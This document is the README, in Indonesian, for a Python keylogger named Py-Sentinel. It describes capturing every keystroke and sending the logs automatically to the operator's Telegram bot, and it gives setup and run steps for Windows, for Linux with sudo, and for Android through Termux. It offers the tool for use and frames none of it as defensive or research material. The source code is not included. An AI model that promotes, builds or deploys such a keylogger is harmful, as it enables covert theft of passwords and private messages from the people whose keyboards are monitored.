# 🛡️ Py-Sentinel Keylogger

**Py-Sentinel Keylogger** adalah skrip pemantauan keyboard (keylogger) berbasis Python yang canggih. Skrip ini dirancang untuk merekam aktivitas penekanan tombol secara mendalam dan mengirimkan hasilnya secara otomatis ke Bot Telegram Anda.

Versi ini merupakan evolusi dari skrip pemantauan orisinal, mempertahankan algoritma **Dynamic Buffering** dan **Spam Filtering**, namun ditingkatkan dengan integrasi Telegram dan sistem **Auto-Chunking**.

## ✨ Fitur Unggulan
- **Full Keyboard Tracking**: Mencatat semua karakter QWERTY, tombol fungsi (F1-F12), dan tombol navigasi sistem.
- **Dynamic Buffer Multiplier**: Algoritma cerdas (Multiplier 1.0 - 5.0) yang menyesuaikan frekuensi pengiriman log berdasarkan kecepatan mengetik pengguna.
- **Telegram Pro Integration**: Tidak lagi menggunakan Webhook Discord, beralih ke Telegram Bot API yang lebih privat.
- **Auto-Chunking System**: Secara otomatis memecah log yang sangat panjang (lebih dari 4000 karakter) agar tidak ditolak oleh limit pesan Telegram.
- **Markdown Formatting**: Log diformat menggunakan gaya Markdown (Monospaced) untuk keterbacaan tinggi.
- **Spam Pattern Recognition**: Mempertahankan filter deteksi spamming tombol (seperti pola `wwwww`) dari kode orisinal.

## 🚀 Panduan Instalasi

### 1. Persiapan Bot Telegram
1. Cari [@BotFather](https://t.me/botfather) di Telegram, buat bot baru (`/newbot`), dan salin **API Token**.
2. Cari [@userinfobot](https://t.me/userinfobot) untuk mendapatkan **Your Chat ID**.
3. Pastikan Anda sudah mengklik **/start** pada bot yang Anda buat.

### 2. Instalasi Library
Skrip ini membutuhkan Python 3.x. Buka terminal dan jalankan:
```bash
pip install pynput requests

Konfigurasi
​Buka file pysentinel_keylogger.py dan masukkan kredensial Anda:
BOT_TOKEN = 'TOKEN_BOT_ANDA'
CHAT_ID = 'ID_CHAT_ANDA'

Windows (CMD/PowerShell) :
python pysentinel_keylogger.py

Linux (Desktop) :
​Catatan: Anda mungkin memerlukan akses sudo untuk memantau input global.
sudo python3 pysentinel_keylogger.py

Android (Termux) :
​Install Python: pkg install python
​Install dependencies: pip install pynput requests
​Jalankan: python pysentinel_ultimate.py
(Memerlukan sesi terminal aktif).
